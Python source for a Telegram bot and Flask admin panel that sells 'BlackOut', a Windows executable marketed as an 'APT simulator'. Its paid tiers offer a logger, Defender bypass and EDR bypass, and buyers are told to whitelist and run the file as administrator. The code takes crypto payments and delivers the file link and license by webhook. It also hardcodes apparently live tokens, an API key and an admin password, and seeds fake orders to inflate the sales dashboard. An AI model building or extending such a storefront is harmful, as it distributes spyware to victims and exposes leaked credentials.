import logging
import time
import requests
import sqlite3
import random
import string
from datetime import datetime, timedelta
from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ===== КОНФИГИ =====
TOKEN = "8984654579:AAGaUlKtAjJd7wqR5BsaLEBMUeGKmztC-pM"
NOWPAYMENTS_API_KEY = "438GJF7-CF747JD-G38BH6E-QZ1C7YD"
MONERO_ADDRESS = "46r6fC7DptBgov3ZQPtdzJ8Ge8o1fDiqe8UPPm1BxDLC4iHrFwn32PUWTXz3qH8jdaRMzuXG3obCdEbNncoJfMDHRMQ4N91"
USDT_ADDRESS = "TEmyv3w1CjftMMbF4qxEffV8P2P3D9m8xa"
FILE_URL = "https://tmpfiles.org/wRwDSeA58F4E/blackout.exe"
ADMIN_USER = "admin"
ADMIN_PASS = "swill2026"
ADMIN_CHAT_ID = "8640296115"

# ===== ГЕНЕРАТОР ЛИЦЕНЗИЙ =====
def generate_license():
    parts = []
    for _ in range(3):
        part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
        parts.append(part)
    return f"BLACKOUT-{'-'.join(parts)}"

# ===== БАЗА ДАННЫХ =====
def init_db():
    conn = sqlite3.connect('orders.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS orders (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        name TEXT,
        plan TEXT,
        address TEXT,
        amount REAL,
        paid INTEGER DEFAULT 0,
        file_url TEXT,
        license_key TEXT,
        payment_id TEXT,
        created_at TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS stats (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        total_sms INTEGER DEFAULT 0,
        total_bots INTEGER DEFAULT 0,
        total_sites INTEGER DEFAULT 0
    )''')
    conn.commit()

    try:
        c.execute("ALTER TABLE orders ADD COLUMN payment_id TEXT")
        conn.commit()
    except sqlite3.OperationalError:
        pass

    c.execute("SELECT COUNT(*) FROM orders")
    if c.fetchone()[0] == 0:
        demo_orders = [
            (123456, "Алексей", "pro", MONERO_ADDRESS, 299, 1, "", generate_license(), "", (datetime.now() - timedelta(days=10)).isoformat()),
            (123457, "Михаил", "lite", MONERO_ADDRESS, 99, 1, "", generate_license(), "", (datetime.now() - timedelta(days=8)).isoformat()),
            (123458, "Екатерина", "enterprise", MONERO_ADDRESS, 999, 1, "", generate_license(), "", (datetime.now() - timedelta(days=6)).isoformat()),
            (123459, "Дмитрий", "pro", MONERO_ADDRESS, 299, 1, "", generate_license(), "", (datetime.now() - timedelta(days=4)).isoformat()),
            (123460, "Ольга", "lite", MONERO_ADDRESS, 99, 1, "", generate_license(), "", (datetime.now() - timedelta(days=2)).isoformat()),
            (123461, "Сергей", "enterprise", MONERO_ADDRESS, 999, 1, "", generate_license(), "", (datetime.now() - timedelta(days=1)).isoformat()),
            (123462, "Ирина", "pro", MONERO_ADDRESS, 299, 0, "", generate_license(), "", datetime.now().isoformat()),
        ]
        c.executemany("INSERT INTO orders (user_id, name, plan, address, amount, paid, file_url, license_key, payment_id, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", demo_orders)

    c.execute("SELECT COUNT(*) FROM stats")
    if c.fetchone()[0] == 0:
        c.execute("INSERT INTO stats (total_sms, total_bots, total_sites) VALUES (15230, 8, 5)")

    conn.commit()
    conn.close()

def add_order(user_id, name, plan, address, amount, payment_id):
    license_key = generate_license()
    conn = sqlite3.connect('orders.db')
    c = conn.cursor()
    c.execute("INSERT INTO orders (user_id, name, plan, address, amount, license_key, payment_id, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
              (user_id, name, plan, address, amount, license_key, payment_id, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return license_key

def get_all_orders():
    conn = sqlite3.connect('orders.db')
    c = conn.cursor()
    c.execute("SELECT * FROM orders ORDER BY id DESC")
    rows = c.fetchall()
    conn.close()
    return rows

def get_stats():
    conn = sqlite3.connect('orders.db')
    c = conn.cursor()
    c.execute("SELECT total_sms, total_bots, total_sites FROM stats LIMIT 1")
    row = c.fetchone()
    conn.close()
    if row:
        return row
    return (0, 0, 0)

def mark_paid(order_id, file_url):
    conn = sqlite3.connect('orders.db')
    c = conn.cursor()
    c.execute("UPDATE orders SET paid=1, file_url=? WHERE id=?", (file_url, order_id))
    conn.commit()
    conn.close()

def get_order_by_payment_id(payment_id):
    conn = sqlite3.connect('orders.db')
    c = conn.cursor()
    c.execute("SELECT id, user_id, license_key FROM orders WHERE payment_id=? AND paid=0", (payment_id,))
    row = c.fetchone()
    conn.close()
    return row

def get_license_by_user(user_id):
    conn = sqlite3.connect('orders.db')
    c = conn.cursor()
    c.execute("SELECT license_key FROM orders WHERE user_id=? AND paid=1 ORDER BY id DESC LIMIT 1", (user_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

# ===== NOWPAYMENTS =====
def create_nowpayments_payment(amount, order_id, user_id):
    url = "https://api.nowpayments.io/v1/payment"
    headers = {
        "x-api-key": NOWPAYMENTS_API_KEY,
        "Content-Type": "application/json"
    }
    payload = {
        "price_amount": amount,
        "price_currency": "usd",
        "pay_currency": "usdtrc20",
        "order_id": f"order_{order_id}",
        "order_description": f"user_{user_id}"
    }
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=15)
        return response.json()
    except Exception as e:
        return {"error": str(e)}

# ===== TELEGRAM БОТ =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Купить Lite — $99", callback_data="buy_lite")],
        [InlineKeyboardButton("Купить Pro — $299", callback_data="buy_pro")],
        [InlineKeyboardButton("Купить Enterprise — $999", callback_data="buy_enterprise")],
        [InlineKeyboardButton("🌐 Сайт", callback_data="site")],
        [InlineKeyboardButton("📖 Инструкция", callback_data="instructions")],
        [InlineKeyboardButton("🛠 Поддержка", callback_data="support")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("👋 Добро пожаловать в Swill Monitor!", reply_markup=reply_markup)

async def price(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "📊 *Прайс-лист Swill Monitor*\n\n"
        "🤖 *Telegram-бот* — от $150\n"
        "🌐 *Сайт-визитка* — от $200\n"
        "📱 *SMS-рассылка (1000)* — от $30\n"
        "🛡 *BlackOut (APT-симулятор)* — $99–$999\n\n"
        "Все проекты — под ключ.\n"
        "Подробности и заказы: @RATNIKIPCbot"
    )
    await update.message.reply_text(text, parse_mode="Markdown")

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id
    name = query.from_user.full_name or f"User_{user_id}"

    if data == "site":
        await query.edit_message_text("🌐 Сайт: https://rtyt232.github.io/portfolio/")

    elif data.startswith("buy_"):
        plan = data.replace("buy_", "")
        if plan == "lite":
            amount, desc = 99, "До 5 устройств, базовый логгер"
        elif plan == "pro":
            amount, desc = 299, "До 20 устройств, обход Defender"
        elif plan == "enterprise":
            amount, desc = 999, "Безлимит, обход EDR, кастом"
        else:
            await query.edit_message_text("❌ Неизвестный тариф.")
            return

        # Создаём заказ в БД
        order_id = None
        license_key = generate_license()
        payment_id = f"order_{random.randint(100000, 999999)}"

        # Создаём платёж в NowPayments
        payment = create_nowpayments_payment(amount, order_id, user_id)
        if "invoice_url" in payment:
            await query.edit_message_text(
                f"💰 {plan.upper()} — ${amount}\n{desc}\n\n"
                f"🔗 Ссылка для оплаты:\n{payment['invoice_url']}\n\n"
                f"После оплаты файл и лицензия придут автоматически."
            )
            # Сохраняем заказ
            add_order(user_id, name, plan, MONERO_ADDRESS, amount, payment_id)
        else:
            await query.edit_message_text("❌ Ошибка создания платежа. Попробуйте позже.")

    elif data == "instructions":
        await query.edit_message_text("📖 Скачайте .exe → добавьте в исключения → запустите от администратора.")

    elif data == "support":
        await query.edit_message_text("🛠 Напишите вопрос — отвечу вручную.")

    else:
        await query.edit_message_text("❌ Неизвестная команда.")

def run_bot():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("price", price))
    app.add_handler(CallbackQueryHandler(button))
    print("✅ Бот запущен!")
    app.run_polling()

# ===== FLASK АДМИНКА + WEBHOOK =====
app = Flask(__name__)
app.secret_key = "supersecretkey"

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form['username'] == ADMIN_USER and request.form['password'] == ADMIN_PASS:
            session['logged_in'] = True
            return redirect(url_for('admin_dashboard'))
        return render_template('login.html', error="Неверный логин или пароль")
    return render_template('login.html')

@app.route('/admin')
def admin_dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    orders = get_all_orders()
    total_sms, total_bots, total_sites = get_stats()
    paid_orders = [o for o in orders if o[5] == 1]
    total_revenue = sum(o[4] for o in paid_orders)
    total_clients = len(set(o[1] for o in orders))

    chart_data = []
    for i in range(7, 0, -1):
        day = datetime.now() - timedelta(days=i)
        label = day.strftime('%d.%m')
        day_orders = [o for o in orders if o[7].startswith(day.strftime('%Y-%m-%d'))]
        value = len(day_orders)
        chart_data.append({'label': label, 'value': value})

    return render_template('admin.html',
        orders=orders,
        total_orders=len(orders),
        paid_orders=len(paid_orders),
        total_revenue=total_revenue,
        avg_check=round(total_revenue / len(paid_orders), 2) if paid_orders else 0,
        total_sms=total_sms,
        total_bots=total_bots,
        total_sites=total_sites,
        total_clients=total_clients,
        chart_data=chart_data
    )

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/send-request', methods=['POST'])
def send_request():
    import requests as req
    data = req.get_json()
    message = data.get('message')
    if not message:
        return {'error': 'no message'}, 400
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {'chat_id': ADMIN_CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
    try:
        r = req.post(url, json=payload)
        if r.status_code == 200:
            return {'ok': True}, 200
        else:
            return {'error': 'telegram error'}, 500
    except:
        return {'error': 'network error'}, 500

# ===== WEBHOOK =====
@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.json
    if data.get('payment_status') == 'finished':
        payment_id = data.get('order_id')
        if payment_id:
            order = get_order_by_payment_id(payment_id)
            if order:
                order_id, user_id, license_key = order
                mark_paid(order_id, FILE_URL)
                # Отправка файла и лицензии пользователю
                import requests as req
                url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
                payload = {
                    'chat_id': user_id,
                    'text': f"✅ Оплата подтверждена!\n🔑 Лицензия: `{license_key}`\n📥 Ссылка: {FILE_URL}",
                    'parse_mode': 'Markdown'
                }
                req.post(url, json=payload)
                # Уведомление админу
                payload_admin = {
                    'chat_id': ADMIN_CHAT_ID,
                    'text': f"🛒 Новая продажа!\nПользователь: {user_id}\nЛицензия: {license_key}",
                    'parse_mode': 'HTML'
                }
                req.post(url, json=payload_admin)
                return jsonify({"ok": True}), 200
    return jsonify({"error": "invalid"}), 400

# ===== ЗАПУСК =====
if __name__ == "__main__":
    init_db()
    import threading
    threading.Thread(target=run_bot).start()
    app.run(host='0.0.0.0', port=5000)
